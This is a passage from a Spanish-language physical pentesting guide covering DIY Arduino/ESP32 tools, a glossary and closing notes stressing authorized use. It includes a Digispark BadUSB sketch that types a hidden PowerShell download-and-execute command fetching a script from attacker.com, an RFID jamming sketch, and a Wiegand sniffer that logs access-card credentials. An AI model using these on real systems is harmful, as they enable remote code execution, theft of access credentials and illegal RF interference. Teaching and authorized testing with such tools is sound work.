**Materiales:**
- Arduino Nano ($5)
- Modulo RC522 ($3) para MIFARE
- Modulo RDM6300 ($5) para EM4100
- LCD 16x2 (opcional)

**Codigo basico:**
```cpp
#include <SPI.h>
#include <MFRC522.h>

#define RST_PIN 9
#define SS_PIN 10

MFRC522 mfrc522(SS_PIN, RST_PIN);

void setup() {
    Serial.begin(9600);
    SPI.begin();
    mfrc522.PCD_Init();
    Serial.println("RFID Reader ready");
}

void loop() {
    if (mfrc522.PICC_IsNewCardPresent()) {
        if (mfrc522.PICC_ReadCardSerial()) {
            Serial.print("UID: ");
            for (byte i = 0; i < mfrc522.uid.size; i++) {
                Serial.print(mfrc522.uid.uidByte[i], HEX);
            }
            Serial.println();
            mfrc522.PICC_HaltA();
        }
    }
}
```

<a name="diy-badusb"></a>
### 22.3 [badusb](../raw/ph7s1c4l-r3d.md#badusb) casero (Digispark)

Digispark es un Arduino USB que cuesta $2 y puede actuar como teclado.

**Codigo:**
```cpp
#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.delay(3000);
    DigiKeyboard.sendKeyStroke(0);
    
    // Abrir Run
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    
    // Escribir comando
    DigiKeyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"");
    
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
```

**Limitaciones:**
- Solo 6KB de memoria para el programa
- No tiene USB 2.0 (es USB 1.1, lento)
- Algunos sistemas no lo detectan como teclado

<a name="diy-rfid-jammer"></a>
### 22.4 RFID Jammer (solo para estudio)

ADVERTENCIA: Hacer jamming de RF es ILEGAL en la mayoria de los paises. Solo para propositos educativos.

**Como funciona:**
1. Generar una senal de ruido en 125kHz o 13.56MHz
2. Impedir que los lectores RFID se comuniquen con las tarjetas
3. Se usa para pruebas de denial of service

**Con Arduino:**
```cpp
void setup() {
    pinMode(9, OUTPUT);  // Pin PWM
}

void loop() {
    // Generar ruido en 125kHz (LF)
    tone(9, 125000);
    delay(1000);
    noTone(9);
    delay(1000);
}
```

<a name="diy-wiegand-tap"></a>
### 22.5 Wiegand sniffer + logger

**Materiales:**
- ESP32 o Arduino
- MicroSD card module
- 3 cables

**Codigo completo (ESP32):**
```cpp
#include <SPI.h>
#include <SD.h>

#define DATA0 4
#define DATA1 5
#define CS_SD 15

volatile unsigned long bits = 0;
volatile int bit_count = 0;

void IRAM_ATTR data0_fall() {
    bits = (bits << 1) | 0;
    bit_count++;
}

void IRAM_ATTR data1_fall() {
    bits = (bits << 1) | 1;
    bit_count++;
}

void setup() {
    Serial.begin(115200);
    pinMode(DATA0, INPUT_PULLUP);
    pinMode(DATA1, INPUT_PULLUP);
    
    attachInterrupt(DATA0, data0_fall, FALLING);
    attachInterrupt(DATA1, data1_fall, FALLING);
    
    if (!SD.begin(CS_SD)) {
        Serial.println("SD Card error");
        return;
    }
    
    Serial.println("Wiegand logger ready");
    
    // Log header
    File log = SD.open("/wiegand.log", FILE_APPEND);
    if (log) {
        log.println("Timestamp,Bits,FC,Card");
        log.close();
    }
}

void loop() {
    if (bit_count > 0) {
        delay(50);  // Esperar a que terminen los bits
        
        if (bit_count == 26) {
            unsigned long fc = (bits >> 17) & 0xFF;
            unsigned long card = (bits >> 1) & 0xFFFF;
            
            Serial.printf("FC: %lu, Card: %lu\n", fc, card);
            
            // Log a SD
            File log = SD.open("/wiegand.log", FILE_APPEND);
            if (log) {
                log.printf("%lu,%d,%lu,%lu\n", millis(), bit_count, fc, card);
                log.close();
            }
        }
        
        bit_count = 0;
        bits = 0;
    }
}
```

<a name="glosario"></a>
## 23. Glosario

| Termino | Definicion |
|---------|------------|
| 125kHz | Frecuencia de [rfid](../raw/ph7s1c4l-r3d.md#rfid) de baja frecuencia (LF) |
| 13.56MHz | Frecuencia de RFID de alta frecuencia (HF) |
| BLE | Bluetooth Low Energy |
| BOK | Bottom of Keyway (tension tool) |
| Card | Numero de tarjeta en formato Wiegand |
| CRYPTO1 | Algoritmo de [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) de MIFARE Classic (roto) |
| DESFire | Familia de tarjetas RFID seguras de NXP |
| DuckyScript | Lenguaje de [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) de [rubber ducky](../raw/ph7s1c4l-r3d.md#rubber-ducky) |
| EM4100 | Tag RFID LF basico |
| FC | Facility Code (codigo de instalacion) |
| GPIO | General Purpose Input/Output |
| HID | Human Interface Device (teclado, raton) |
| HID Prox | Marca de tarjetas y lectores RFID LF |
| iClass | Familia de tarjetas RFID HF de HID |
| LF | Low Frequency (125kHz) |
| MIFARE | Familia de tarjetas RFID HF de NXP |
| OSDP | Open Supervised Device Protocol |
| PM3 | Proxmark3 |
| Rake | Ganzua de barrido multiple |
| RDV4 | Revision 4 del Proxmark3 |
| [sdr](../raw/sdr-t3l3c0ms.md) | [software defined radio](../raw/sdr-t3l3c0ms.md) |
| SEH | Structured Exception Handling |
| SPP | Single Pin Picking |
| T55x7 | Tarjeta LF programable |
| TOK | Top of Keyway (tension tool) |
| UID | Unique Identifier de una tarjeta RFID |
| Wiegand | [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) de comunicacion entre lector y panel |


---

*Documento creado por el equipo de [forense](../raw/w1n-f0r3ns1cs.md#forense). Prohibida su reproduccion sin [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion).*
*Para propositos educativos y pruebas de seguridad autorizadas unicamente.*


<a name="final-notes"></a>
## 24. Notas Finales

Recorda siempre: el objetivo del pentesting [fisico](../raw/ph7s1c4l-r3d.md) es mejorar la seguridad, no vulnerarla.
Cada tecnica aprendida debe ser usada con responsabilidad y solo en entornos autorizados.

**Mantene el aprendizaje:**
- Practica [lockpicking](../raw/ph7s1c4l-r3d.md#lockpicking) 15 minutos por dia
- Lleva siempre tu Proxmark3 a pentests
- Comparti conocimiento con la comunidad
- Asisti a conferencias (Ekoparty, DEF CON, DragonJAR)

*La seguridad es un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos), no un producto.*

